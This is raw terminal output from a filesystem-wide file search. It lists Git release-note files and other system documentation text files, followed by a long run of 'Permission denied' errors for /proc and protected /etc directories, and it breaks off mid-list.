-rw-r--r-- 1 root root 991 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.2.txt
-rw-r--r-- 1 root root 2454 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.0.1.txt
-rw-r--r-- 1 root root 245 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.2.txt
-rw-r--r-- 1 root root 431 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.3.1.txt
-rw-r--r-- 1 root root 783 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.8.txt
-rw-r--r-- 1 root root 1255 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.1.txt
-rw-r--r-- 1 root root 772 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.2.txt
-rw-r--r-- 1 root root 1188 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.1.txt
-rw-r--r-- 1 root root 1264 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.4.txt
-rw-r--r-- 1 root root 14424 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.txt
-rw-r--r-- 1 root root 2248 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.1.txt
-rw-r--r-- 1 root root 1599 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.6.2.txt
-rw-r--r-- 1 root root 899 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.1.txt
-rw-r--r-- 1 root root 2941 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.1.txt
-rw-r--r-- 1 root root 1876 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.3.txt
-rw-r--r-- 1 root root 609 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.5.txt
-rw-r--r-- 1 root root 467 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.7.txt
-rw-r--r-- 1 root root 1355 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.3.txt
-rw-r--r-- 1 root root 2461 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.1.txt
-rw-r--r-- 1 root root 888 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.4.txt
-rw-r--r-- 1 root root 3843 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.txt
-rw-r--r-- 1 root root 326 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.1.txt
-rw-r--r-- 1 root root 2438 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.2.2.txt
-rw-r--r-- 1 root root 2925 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.2.txt
-rw-r--r-- 1 root root 969 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.5.txt
-rw-r--r-- 1 root root 1931 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.2.txt
-rw-r--r-- 1 root root 792 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.3.txt
-rw-r--r-- 1 root root 452 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.8.txt
-rw-r--r-- 1 root root 859 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.3.txt
-rw-r--r-- 1 root root 2291 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.2.txt
-rw-r--r-- 1 root root 1767 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.12.2.txt
-rw-r--r-- 1 root root 2308 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.2.txt
-rw-r--r-- 1 root root 771 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.7.txt
-rw-r--r-- 1 root root 621 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.6.txt
-rw-r--r-- 1 root root 3436 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.6.txt
-rw-r--r-- 1 root root 1293 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.4.txt
-rw-r--r-- 1 root root 452 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.4.txt
-rw-r--r-- 1 root root 731 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.5.txt
-rw-r--r-- 1 root root 806 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.1.txt
-rw-r--r-- 1 root root 5357 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.txt
-rw-r--r-- 1 root root 712 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.12.4.txt
-rw-r--r-- 1 root root 1906 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.1.txt
-rw-r--r-- 1 root root 224 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.1.txt
-rw-r--r-- 1 root root 581 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.2.txt
-rw-r--r-- 1 root root 1958 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.3.txt
-rw-r--r-- 1 root root 2189 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.5.2.txt
-rw-r--r-- 1 root root 424 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.0.3.txt
-rw-r--r-- 1 root root 1778 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.3.3.txt
-rw-r--r-- 1 root root 2432 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.1.txt
-rw-r--r-- 1 root root 20348 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.txt
-rw-r--r-- 1 root root 1508 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.2.txt
-rw-r--r-- 1 root root 802 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.4.txt
-rw-r--r-- 1 root root 127 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.5.txt
-rw-r--r-- 1 root root 219 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.5.txt
-rw-r--r-- 1 root root 9624 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.txt
-rw-r--r-- 1 root root 22140 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.2.txt
-rw-r--r-- 1 root root 13288 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.txt
-rw-r--r-- 1 root root 1584 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.7.txt
-rw-r--r-- 1 root root 1330 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.12.3.txt
-rw-r--r-- 1 root root 3010 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.1.txt
-rw-r--r-- 1 root root 1250 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.0.2.txt
-rw-r--r-- 1 root root 3825 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.1.1.txt
-rw-r--r-- 1 root root 915 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.5.txt
-rw-r--r-- 1 root root 2840 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.2.txt
-rw-r--r-- 1 root root 2706 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.2.txt
-rw-r--r-- 1 root root 1287 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.1.txt
-rw-r--r-- 1 root root 2075 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.3.txt
-rw-r--r-- 1 root root 397 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.5.txt
-rw-r--r-- 1 root root 421 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.5.txt
-rw-r--r-- 1 root root 2113 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.3.txt
-rw-r--r-- 1 root root 21237 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.txt
-rw-r--r-- 1 root root 751 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.6.3.txt
-rw-r--r-- 1 root root 9025 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.txt
-rw-r--r-- 1 root root 18336 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.3.txt
-rw-r--r-- 1 root root 8765 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.txt
-rw-r--r-- 1 root root 340 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.4.txt
-rw-r--r-- 1 root root 1432 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.6.txt
-rw-r--r-- 1 root root 1288 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.4.txt
-rw-r--r-- 1 root root 5978 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.txt
-rw-r--r-- 1 root root 2314 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.3.txt
-rw-r--r-- 1 root root 1292 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.5.txt
-rw-r--r-- 1 root root 1651 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.2.txt
-rw-r--r-- 1 root root 1351 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.4.txt
-rw-r--r-- 1 root root 444 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.4.txt
-rw-r--r-- 1 root root 896 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.3.txt
-rw-r--r-- 1 root root 606 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.5.txt
-rw-r--r-- 1 root root 449 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.5.txt
-rw-r--r-- 1 root root 7355 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.txt
-rw-r--r-- 1 root root 1457 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.2.txt
-rw-r--r-- 1 root root 481 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.5.txt
-rw-r--r-- 1 root root 1438 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.1.txt
-rw-r--r-- 1 root root 2642 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.txt
-rw-r--r-- 1 root root 342 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.6.txt
-rw-r--r-- 1 root root 1454 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.5.txt
-rw-r--r-- 1 root root 140 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.4.txt
-rw-r--r-- 1 root root 4373 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.txt
-rw-r--r-- 1 root root 5892 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.txt
-rw-r--r-- 1 root root 1593 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.1.4.txt
-rw-r--r-- 1 root root 365 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.6.txt
-rw-r--r-- 1 root root 6791 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.3.txt
-rw-r--r-- 1 root root 1519 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.6.txt
-rw-r--r-- 1 root root 1056 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.4.txt
-rw-r--r-- 1 root root 14030 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.txt
-rw-r--r-- 1 root root 887 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.4.txt
-rw-r--r-- 1 root root 791 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.6.txt
-rw-r--r-- 1 root root 254 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.1.txt
-rw-r--r-- 1 root root 5329 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.5.txt
-rw-r--r-- 1 root root 342 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.7.txt
-rw-r--r-- 1 root root 5507 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.txt
-rw-r--r-- 1 root root 1530 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.2.txt
-rw-r--r-- 1 root root 4561 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.2.1.txt
-rw-r--r-- 1 root root 2241 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.5.txt
-rw-r--r-- 1 root root 1457 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.1.txt
-rw-r--r-- 1 root root 1208 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.4.txt
-rw-r--r-- 1 root root 5409 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.txt
-rw-r--r-- 1 root root 997 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.3.txt
-rw-r--r-- 1 root root 343 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.3.1.txt
-rw-r--r-- 1 root root 1640 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.1.2.txt
-rw-r--r-- 1 root root 1041 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.5.txt
-rw-r--r-- 1 root root 1959 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.7.txt
-rw-r--r-- 1 root root 15198 Nov 27  2018 /usr/share/doc/git/RelNotes/1.9.0.txt
-rw-r--r-- 1 root root 2290 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.2.txt
-rw-r--r-- 1 root root 1176 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.3.txt
-rw-r--r-- 1 root root 2409 Nov 27  2018 /usr/share/doc/git/RelNotes/1.9.1.txt
-rw-r--r-- 1 root root 18638 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.txt
-rw-r--r-- 1 root root 781 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.3.txt
-rw-r--r-- 1 root root 1146 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.3.txt
-rw-r--r-- 1 root root 1891 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.5.txt
-rw-r--r-- 1 root root 1171 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.4.txt
-rw-r--r-- 1 root root 1577 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.3.txt
-rw-r--r-- 1 root root 1069 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.1.2.txt
-rw-r--r-- 1 root root 425 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.1.txt
-rw-r--r-- 1 root root 754 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.5.4.txt
-rw-r--r-- 1 root root 484 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.6.txt
-rw-r--r-- 1 root root 10049 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.txt
-rw-r--r-- 1 root root 342 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.6.txt
-rw-r--r-- 1 root root 2406 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.3.2.txt
-rw-r--r-- 1 root root 3376 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.3.5.txt
-rw-r--r-- 1 root root 6351 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.txt
-rw-r--r-- 1 root root 1379 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.3.3.txt
-rw-r--r-- 1 root root 549 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.1.txt
-rw-r--r-- 1 root root 700 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.3.4.txt
-rw-r--r-- 1 root root 791 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.6.txt
-rw-r--r-- 1 root root 432 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.6.txt
-rw-r--r-- 1 root root 334 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.7.txt
-rw-r--r-- 1 root root 5506 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.11.txt
-rw-r--r-- 1 root root 847 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.1.3.txt
-rw-r--r-- 1 root root 3074 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.1.txt
-rw-r--r-- 1 root root 431 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.3.txt
-rw-r--r-- 1 root root 1237 Aug  9  2011 /usr/share/doc/python-serial/README.txt
-rw-r--r-- 1 root root 2415 Nov  4  2013 /usr/share/doc/libtxc-dxtn-s2tc0/README.txt
-rw-r--r-- 1 root root 1009 Oct 20  2013 /usr/share/doc/dpkg-dev/frontend.txt
-rw-r--r-- 1 root root 2734 Jul 29  2014 /usr/share/doc/byobu/help.tmux.txt
-rw-r--r-- 1 root root 498 Jul 29  2014 /usr/share/doc/byobu/help.screen.txt
-rw-r--r-- 1 root root 2183 Nov 16  2017 /usr/share/doc/linux-firmware/licenses/LICENCE.tda7706-firmware.txt
-rw-r--r-- 1 root root 2115 Nov 16  2017 /usr/share/doc/linux-firmware/licenses/LICENCE.rtlwifi_firmware.txt
-rw-r--r-- 1 root root 2115 Nov 16  2017 /usr/share/doc/linux-firmware/licenses/LICENCE.realtek-firmware.txt
-rw-r--r-- 1 root root 2103 Nov 16  2017 /usr/share/doc/linux-firmware/licenses/LICENCE.ralink-firmware.txt
-rw-r--r-- 1 root root 165 Mar 28  2012 /usr/share/doc/gawk/examples/network/stoxdata.txt
-rw-r--r-- 1 root root 2511 Apr  4  2014 /usr/share/doc/apport/symptoms.txt
-rw-r--r-- 1 root root 2272 Jul 25  2013 /usr/share/doc/gnupg/Upgrading_From_PGP.txt
-rw-r--r-- 1 root root 2598 Jan  6  2014 /usr/share/doc/openssl/fingerprints.txt
-rw-r--r-- 1 root root 2603 Jan  6  2014 /usr/share/doc/openssl/HOWTO/keys.txt
-rw-r--r-- 1 root root 9 Nov 21  2017 /usr/share/doc/libdb5.3/build_signature_amd64.txt
-rw-r--r-- 1 root root 1645 Jul 27  2013 /usr/share/doc/python3-distlib/CONTRIBUTORS.txt
-rw-r--r-- 1 root root 1756 Oct 15  2012 /usr/share/doc/lvm2/pvmove_outline.txt
-rw-r--r-- 1 root root 4062 Oct 15  2012 /usr/share/doc/lvm2/udev_assembly.txt
-rw-r--r-- 1 root root 1204 Oct 15  2012 /usr/share/doc/lvm2/testing.txt
-rw-r--r-- 1 root root 1384 Dec 22  2012 /usr/share/doc/busybox-static/syslog.conf.txt
find: `/etc/lvm/backup': Permission denied
find: `/etc/lvm/archive': Permission denied
find: `/etc/polkit-1/localauthority': Permission denied
find: `/etc/ssl/private': Permission denied
-rw-r--r-- 1 root root 17394 Dec  3  2009 /etc/X11/rgb.txt
find: `/sys/kernel/debug': Permission denied
-rw-r--r-- 1 root root 699 Oct 18 17:28 /boot/grub/gfxblacklist.txt
find: `/boot/lost+found': Permission denied
find: `/proc/tty/driver': Permission denied
find: `/proc/1/task/1/fd': Permission denied
find: `/proc/1/task/1/fdinfo': Permission denied
find: `/proc/1/task/1/ns': Permission denied
find: `/proc/1/fd': Permission denied
find: `/proc/1/map_files': Permission denied
find: `/proc/1/fdinfo': Permission denied
find: `/proc/1/ns': Permission denied
find: `/proc/2/task/2/fd': Permission denied
find: `/proc/2/task/2/fdinfo': Permission denied
find: `/proc/2/task/2/ns': Permission denied
find: `/proc/2/fd': Permission denied
find: `/proc/2/map_files': Permission denied
find: `/proc/2/fdinfo': Permission denied
find: `/proc/2/ns': Permission denied
find: `/proc/3/task/3/fd': Permission denied
find: `/proc/3/task/3/fdinfo': Permission denied
find: `/proc/3/task/3/ns': Permission denied
find: `/proc/3/fd': Permission denied
find: `/proc/3/map_files': Permission denied
find: `/proc/3/fdinfo': Permission denied
find: `/proc/3/ns': Permission denied
find: `/proc/5/task/5/fd': Permission denied
find: `/proc/5/task/5/fdinfo': Permission denied
find: `/proc/5/task/5/ns': Permission denied
find: `/proc/5/fd': Permission denied
find: `/proc/5/map_files': Permission denied
find: `/proc/5/fdinfo': Permission denied
find: `/proc/5/ns': Permission denied
find: `/proc/7/task/7/fd': Permission denied
find: `/proc/7/task/7/fdinfo': Permission denied
find: `/proc/7/task/7/ns': Permission denied
find: `/proc/7/fd': Permission denied
find: `/proc/7/map_files': Permission denied
find: `/proc/7/fdinfo': Permission denied
find: `/proc/7/ns': Permission denied
find: `/proc/8/task/8/fd': Permission denied
find: `/proc/8/task/8/fdinfo': Permission denied
find: `/proc/8/task/8/ns': Permission denied
find: `/proc/8/fd': Permission denied
find: `/proc/8/map_files': Permission denied
find: `/proc/8/fdinfo': Permission denied
find: `/proc/8/ns': Permission denied
find: `/proc/9/task/9/fd': Permission denied
find: `/proc/9/task/9/fdinfo': Permission denied
find: `/proc/9/task/9/ns': Permission denied
find: `/proc/9/fd': Permission denied
find: `/proc/9/map_files': Permission denied
find: `/proc/9/fdinfo': Permission denied
find: `/proc/9/ns': Permission denied
find: `/proc/10/task/10/fd': Permission denied
find: `/proc/10/task/10/fdinfo': Permission denied
find: `/proc/10/task/10/ns': Permission denied
find: `/proc/10/fd': Permission denied
find: `/proc/10/map_files': Permission denied
find: `/proc/10/fdinfo': Permission denied
find: `/proc/10/ns': Permission denied
find: `/proc/11/task/11/fd': Permission denied
find: `/proc/11/task/11/fdinfo': Permission denied
find: `/proc/11/task/11/ns': Permission denied
find: `/proc/11/fd': Permission denied
find: `/proc/11/map_files': Permission denied
find: `/proc/11/fdinfo': Permission denied
find: `/proc/11/ns': Permission denied
find: `/proc/12/task/12/fd': Permission denied
find: `/proc/12/task/12/fdinfo': Permission denied
find: `/proc/12/task/12/ns': Permission denied
find: `/proc/12/fd': Permission denied
find: `/proc/12/map_files': Permission denied
find: `/proc/12/fdinfo': Permission denied
find: `/proc/12/ns': Permission denied
find: `/proc/13/task/13/fd': Permission denied
find: `/proc/13/task/13/fdinfo': Permission denied
find: `/proc/13/task/13/ns': Permission denied
find: `/proc/13/fd': Permission denied
find: `/proc/13/map_files': Permission denied
find: `/proc/13/fdinfo': Permission denied
find: `/proc/13/ns': Permission denied
find: `/proc/14/task/14/fd': Permission denied
find: `/proc/14/task/14/fdinfo': Permission denied
find: `/proc/14/task/14/ns': Permission denied
find: `/proc/14/fd': Permission denied
find: `/proc/14/map_files': Permission denied
find: `/proc/14/fdinfo': Permission denied
find: `/proc/14/ns': Permission denied
find: `/proc/15/task/15/fd': Permission denied
find: `/proc/15/task/15/fdinfo': Permission denied
find: `/proc/15/task/15/ns': Permission denied
find: `/proc/15/fd': Permission denied
find: `/proc/15/map_files': Permission denied
find: `/proc/15/fdinfo': Permission denied
find: `/proc/15/ns': Permission denied
find: `/proc/16/task/16/fd': Permission denied
find: `/proc/16/task/16/fdinfo': Permission denied
find: `/proc/16/task/16/ns': Permission denied
find: `/proc/16/fd': Permission denied
find: `/proc/16/map_files': Permission denied
find: `/proc/16/fdinfo': Permission denied
find: `/proc/16/ns': Permission denied
find: `/proc/17/task/17/fd': Permission denied
find: `/proc/17/task/17/fdinfo': Permission denied
find: `/proc/17/task/17/ns': Permission denied
find: `/proc/17/fd': Permission denied
find: `/proc/17/map_files': Permission denied
find: `/proc/17/fdinfo': Permission denied
find: `/proc/17/ns': Permission denied
find: `/proc/18/task/18/fd': Permission denied
find: `/proc/18/task/18/fdinfo': Permission denied
find: `/proc/18/task/18/ns': Permission denied
find: `/proc/18/fd': Permission denied
find: `/proc/18/map_files': Permission denied
find: `/proc/18/fdinfo': Permission denied
find: `/proc/18/ns': Permission denied
find: `/proc/19/task/19/fd': Permission denied
find: `/proc/19/task/19/fdinfo': Permission denied
find: `/proc/19/task/19/ns': Permission denied
find: `/proc/19/fd': Permission denied
find: `/proc/19/map_files': Permission denied
find: `/proc/19/fdinfo': Permission denied
find: `/proc/19/ns': Permission denied
find: `/proc/20/task/20/fd': Permission denied
find: `/proc/20/task/20/fdinfo': Permission denied
find: `/proc/20/task/20/ns': Permission denied
find: `/proc/20/fd': Permission denied
find: `/proc/20/map_files': Permission denied
find: `/proc/20/fdinfo': Permission denied
find: `/proc/20/ns': Permission denied
find: `/proc/21/task/21/fd': Permission denied
find: `/proc/21/task/21/fdinfo': Permission denied
find: `/proc/21/task/21/ns': Permission denied
find: `/proc/21/fd': Permission denied
find: `/proc/21/map_files': Permission denied
find: `/proc/21/fdinfo': Permission denied
find: `/proc/21/ns': Permission denied
find: `/proc/22/task/22/fd': Permission denied
find: `/proc/22/task/22/fdinfo': Permission denied
find: `/proc/22/task/22/ns': Permission denied
find: `/proc/22/fd': Permission denied
find: `/proc/22/map_files': Permission denied
find: `/proc/22/fdinfo': Permission denied
find: `/proc/22/ns': Permission denied
find: `/proc/23/task/23/fd': Permission denied
find: `/proc/23/task/23/fdinfo': Permission denied
find: `/proc/23/task/23/ns': Permission denied
find: `/proc/23/fd': Permission denied
find: `/proc/23/map_files': Permission denied
find: `/proc/23/fdinfo': Permission denied
find: `/proc/23/ns': Permission denied
find: `/proc/24/task/24/fd': Permission denied
find: `/proc/24/task/24/fdinfo': Permission denied
find: `/proc/24/task/24/ns': Permission denied
find: `/proc/24/fd': Permission denied
find: `/proc/24/map_files': Permission denied
find: `/proc/24/fdinfo': Permission denied
find: `/proc/24/ns': Permission denied
find: `/proc/25/task/25/fd': Permission denied
find: `/proc/25/task/25/fdinfo': Permission denied
find: `/proc/25/task/25/ns': Permission denied
find: `/proc/25/fd': Permission denied
find: `/proc/25/map_files': Permission denied
find: `/proc/25/fdinfo': Permission denied
find: `/proc/25/ns': Permission denied
find: `/proc/26/task/26/fd': Permission denied
find: `/proc/26/task/26/fdinfo': Permission denied
find: `/proc/26/task/26/ns': Permission denied
find: `/proc/26/fd': Permission denied
find: `/proc/26/map_files': Permission denied
find: `/proc/26/fdinfo': Permission denied
find: `/proc/26/ns': Permission denied
find: `/proc/27/task/27/fd': Permission denied
find: `/proc/27/task/27/fdinfo': Permission denied
find: `/proc/27/task/27/ns': Permission denied
find: `/proc/27/fd': Permission denied
find: `/proc/27/map_files': Permission denied
find: `/proc/27/fdinfo': Permission denied
find: `/proc/27/ns': Permission denied
find: `/proc/28/task/28/fd': Permission denied
find: `/proc/28/task/28/fdinfo': Permission denied
find: `/proc/28/task/28/ns': Permission denied
find: `/proc/28/fd': Permission denied
find: `/proc/28/map_files': Permission denied
find: `/proc/28/fdinfo': Permission denied
find: `/proc/28/ns': Permission denied
find: `/proc/30/task/30/fd': Permission denied
find: `/proc/30/task/30/fdinfo': Permission denied
find: `/proc/30/task/30/ns': Permission denied
find: `/proc/30/fd': Permission denied
find: `/proc/30/map_files': Permission denied
find: `/proc/30/fdinfo': Permission denied
find: `/proc/30/ns': Permission denied
find: `/proc/31/task/31/fd': Permission denied
find: `/proc/31/task/31/fdinfo': Permission denied
find: `/proc/31/task/31/ns': Permission denied
find: `/proc/31/fd': Permission denied
find: `/proc/31/map_files': Permission denied
find: `/proc/31/fdinfo': Permission denied
find: `/proc/31/ns': Permission denied
find: `/proc/32/task/32/fd': Permission denied
find: `/proc/32/task/32/fdinfo': Permission denied
find: `/proc/32/task/32/ns': Permission denied
find: `/proc/32/fd': Permission denied
find: `/proc/32/map_files': Permission denied
find: `/proc/32/fdinfo': Permission denied
find: `/proc/32/ns': Permission denied
find: `/proc/33/task/33/fd': Permission denied
find: `/proc/33/task/33/fdinfo': Permission denied
find: `/proc/33/task/33/ns': Permission denied
find: `/proc/33/fd': Permission denied
find: `/proc/33/map_files': Permission denied
find: `/proc/33/fdinfo': Permission denied
find: `/proc/33/ns': Permission denied
find: `/proc/49/task/49/fd': Permission denied
find: `/proc/49/task/49/fdinfo': Permission denied
find: `/proc/49/task/49/ns': Permission denied
find: `/proc/49/fd': Permission denied
find: `/proc/49/map_files': Permission denied
find: `/proc/49/fdinfo': Permission denied
find: `/proc/49/ns': Permission denied
find: `/proc/50/task/50/fd': Permission denied
find: `/proc/50/task/50/fdinfo': Permission denied
find: `/proc/50/task/50/ns': Permission denied
find: `/proc/50/fd': Permission denied
find: `/proc/50/map_files': Permission denied
find: `/proc/50/fdinfo': Permission denied
find: `/proc/50/ns': Permission denied
find: `/proc/51/task/51/fd': Permission denied
find: `/proc/51/task/51/fdinfo': Permission denied
find: `/proc/51/task/51/ns': Permission denied
find: `/proc/51/fd': Permission denied
find: `/proc/51/map_files': Permission denied
find: `/proc/51/fdinfo': Permission denied
find: `/proc/51/ns': Permission denied
find: `/proc/52/task/52/fd': Permission denied
find: `/proc/52/task/52/fdinfo': Permission denied
find: `/proc/52/task/52/ns': Permission denied
find: `/proc/52/fd': Permission denied
find: `/proc/52/map_files': Permission denied
find: `/proc/52/fdinfo': Permission denied
find: `/proc/52/ns': Permission denied
find: `/proc/53/task/53/fd': Permission denied
find: `/proc/53/task/53/fdinfo': Permission denied
find: `/proc/53/task/53/ns': Permission denied
find: `/proc/53/fd': Permission denied
find: `/proc/53/map_files': Permission denied
find: `/proc/53/fdinfo': Permission denied
find: `/proc/53/ns': Permission denied
find: `/proc/54/task/54/fd': Permission denied
find: `/proc/54/task/54/fdinfo': Permission denied
find: `/proc/54/task/54/ns': Permission denied
find: `/proc/54/fd': Permission denied
find: `/proc/54/map_files': Permission denied
find: `/proc/54/fdinfo': Permission denied
find: `/proc/54/ns': Permission denied
find: `/proc/55/task/55/fd': Permission denied
find: `/proc/55/task/55/fdinfo': Permission denied
find: `/proc/55/task/55/ns': Permission denied
find: `/proc/55/fd': Permission denied
find: `/proc/55/map_files': Permission denied
find: `/proc/55/fdinfo': Permission denied
find: `/proc/55/ns': Permission denied
find: `/proc/56/task/56/fd': Permission denied
find: `/proc/56/task/56/fdinfo': Permission denied
find: `/proc/56/task/56/ns': Permission denied
find: `/proc/56/fd': Permission denied
find: `/proc/56/map_files': Permission denied
find: `/proc/56/fdinfo': Permission denied
find: `/proc/56/ns': Permission denied
find: `/proc/57/task/57/fd': Permission denied
find: `/proc/57/task/57/fdinfo': Permission denied
find: `/proc/57/task/57/ns': Permission denied
find: `/proc/57/fd': Permission denied
